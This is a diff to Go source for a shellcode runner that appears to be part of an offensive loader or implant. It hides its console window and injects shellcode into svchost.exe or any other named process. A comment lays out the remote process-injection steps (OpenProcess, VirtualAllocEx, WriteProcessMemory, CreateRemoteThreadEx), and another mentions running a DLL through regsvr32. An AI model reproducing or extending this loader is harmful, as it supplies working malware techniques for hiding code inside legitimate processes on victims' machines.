@@ -19,8 +19,8 @@ func CommandExecuter(cmd *exec.Cmd){//if it fails to build use exec.Command
   cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 }
 
-
-func (scr *ShellCodeRunner) RunShellCode()error{
+// inject shelcode throught various means
+func (scr *ShellCodeRunner) RunShellCode() error {
   switch scr.Method {
     case 1:
       err := scr.DirectSyscall()
@@ -86,18 +86,7 @@ func (scr *ShellCodeRunner) CreateThread()error{
   with regsvr32.exe /i minion.dll
 */
 
-
-// PROCESS INJECTION
-/*
-  1. Finad a suitable process that you  have a security token to access
-  2. Open a process handle with OpenProcess()
-  3. Allocate memory in remote process with VirtualAllocEx()
-  4. Write Shellcode into process memory with WriteProcessMemory
-  5. OPTIONAL: tighten up memory protections with VirtualProtectEx()
-  6. Create remote thread with CreateRemoteThreadEx()
-*/
-
-func findProcess(proc string) int{
+func FindProcess(proc string) int{
   processList,err := ps.Processes()
   if err != nil { return -1 }
   for _,x := range processList {
@@ -116,8 +105,21 @@ func findProcess(proc string) int{
   return 0
 }
 
-func (scr *ShellCodeRunner) InjectProcess()error{
-  pid  := findProcess("svchost.exe")
+// PROCESS INJECTION
+/*
+  1. Finad a suitable process that you  have a security token to access
+  2. Open a process handle with OpenProcess()
+  3. Allocate memory in remote process with VirtualAllocEx()
+  4. Write Shellcode into process memory with WriteProcessMemory
+  5. OPTIONAL: tighten up memory protections with VirtualProtectEx()
+  6. Create remote thread with CreateRemoteThreadEx()
+*/
+// inject into a given process given the name
+func (scr *ShellCodeRunner) InjectProcess(proc string)error{
+  if len(proc) < 0 || proc == "" {
+    proc = "svchost.exe"
+  }
+  pid  := FindProcess(proc)
   fmt.Printf("[+]  Injecting into svchost.exe, PID=[%d]\n",pid)
   if pid == 0{
     return errors.New("Can  not find svchost.exe")
